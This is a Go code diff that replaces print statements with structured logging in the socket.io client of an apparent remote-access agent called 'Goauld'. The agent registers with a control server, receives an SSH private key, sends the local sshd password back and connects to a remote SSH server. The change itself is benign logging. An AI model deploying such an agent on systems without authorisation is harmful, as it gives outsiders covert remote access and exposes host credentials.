@@ -4,6 +4,7 @@ import (
 	"Goauld/agent/agent"
 	"Goauld/agent/ssh"
 	"Goauld/common/crypto"
+	"Goauld/common/log"
 	socketio "Goauld/common/socket.io"
 	"context"
 	"crypto/tls"
@@ -17,49 +18,60 @@ import (
 
 func NewClient(ctx context.Context) error {
 	cfg := getEioConfig()
-
-	manager := sio.NewManager(agent.Get().SocketIoUrl(), cfg)
+	url := agent.Get().SocketIoUrl()
+	manager := sio.NewManager(url, cfg)
 	socket := manager.Socket("/", nil)
 
 	socket.OnConnect(func() {
-		fmt.Println("Connected")
+		log.Trace().Msg("OnConnect")
+		log.Info().Msgf("Connected to the control server %s", url)
 	})
 	manager.OnError(func(err error) {
-		fmt.Printf("Error: %v\n", err)
+		log.Trace().Msg("OnError")
+		log.Error().Err(err).Msgf("Error occured  %s", url)
 	})
 	manager.OnReconnect(func(attempt uint32) {
-		fmt.Printf("Reconnected. Number of attempts so far: %d\n\n", attempt)
+		log.Trace().Msg("OnReconnect")
+		log.Warn().Msgf("Reconnected to the control server %s, attempts N° %d", url, attempt)
 	})
 	socket.OnConnectError(func(err any) {
-		fmt.Printf("Connect error: %v\n\n", err)
+		log.Trace().Msg("OnConnectError")
+		log.Error().Msgf("Error occured connecting to %s (%v)", url, err)
 	})
 
 	socket.OnEvent(socketio.SendSshPrivateKeyEvent, func(data []byte) {
-		fmt.Println("start" + socketio.SendSshPrivateKeyEvent)
+		log.Trace().Msg("OnEvent: SendSshPrivateKeyEvent")
+		log.Debug().Msgf("SshPrivateKeyEvent: data reveived")
 		privateKey, err := socketio.DecryptSshPrivateKeyMessage(data, agent.Get().Cryptor)
 		if err != nil {
-			fmt.Printf("Error decrypting private key: %v\n", err)
+			log.Error().Err(err).Msgf("Error decrypting private key")
 		}
 		agent.Get().SShPrivateKey = privateKey.SshPrivateKey
-		fmt.Printf("Ssh private key received: %s\n", agent.Get().SShPrivateKey)
-		fmt.Println("sending local sshd password")
+		log.Debug().Msgf("Ssh private key received and successfully decrypted")
+		log.Debug().Msgf("Sending local sshd password")
 		localSshPassword, err := socketio.NewEncryptedAgentSshPasswordMessage(agent.Get().LocalSShdPassword(), agent.Get().Cryptor)
 		if err != nil {
-			fmt.Printf("Error encrypting local sshd password: %v\n", err)
+			log.Error().Err(err).Msgf("Error encrypting local sshd password")
 		}
+		log.Debug().Msgf("Local sshd password sent")
 		socket.Emit(socketio.SendAgentSshPasswordEvent, localSshPassword)
-		fmt.Println("connecting to remote ssh server")
+		log.Debug().Msgf("Conecting to remote ssh server")
 		ssh.Connect()
-		fmt.Println("end" + socketio.SendSshPrivateKeyEvent)
+		log.Warn().Msgf("Remote ssh server terminated")
 
+		log.Trace().Msg("OnEvent: SendSshPrivateKeyEvent done")
 	})
 
 	socket.OnEvent(socketio.SendSshHPrivateKeyError, func() {
-		fmt.Println("OnEvent socketio.SendSshHPrivateKeyError!")
+		log.Trace().Msg("OnEvent: SendSshHPrivateKeyError")
+		log.Error().Msgf("Error occured (%s) %s", "SendSshHPrivateKeyError", url)
+		log.Trace().Msg("OnEvent: SendSshHPrivateKeyError done")
 	})
 
 	socket.OnEvent(socketio.SendSshPrivateKeySuccess, func() {
-		fmt.Println("OnEvent socketio.SendSshPrivateKeySuccess!")
+		log.Trace().Msg("OnEvent: SendSshPrivateKeySuccess")
+		log.Debug().Msgf("Event SendSshPrivateKeySuccess received")
+		log.Trace().Msg("OnEvent: SendSshPrivateKeySuccess done")
 	})
 
 	encryptedKey, err := crypto.AsymEncrypt(agent.Get().AgePubKey, agent.Get().SharedSecret)
@@ -80,10 +92,13 @@ func NewClient(ctx context.Context) error {
 	})
 
 	socket.Connect()
-	fmt.Println("connecting")
+	log.Trace().Msgf("Connected to the control server %s", url)
+	log.Trace().Msg("Event send: RegisterEvent")
 	select {
 	case <-ctx.Done():
+		log.Warn().Msgf("Shutting done the socketio control socket")
 		socket.Emit(socketio.Disconnect, socketio.DisconnectMessage{})
+		log.Trace().Msg("Event send: Disconnect")
 		socket.Disconnect()
 	}
 	return nil
@@ -93,7 +108,7 @@ func getEioConfig() *sio.ManagerConfig {
 	return &sio.ManagerConfig{
 		EIO: eio.ClientConfig{
 			UpgradeDone: func(transportName string) {
-				fmt.Printf("Client transport is upgrade done\n")
+				log.Trace().Msg("Client transport upgrade done")
 			},
 			HTTPTransport: &http.Transport{
 				TLSClientConfig: &tls.Config{
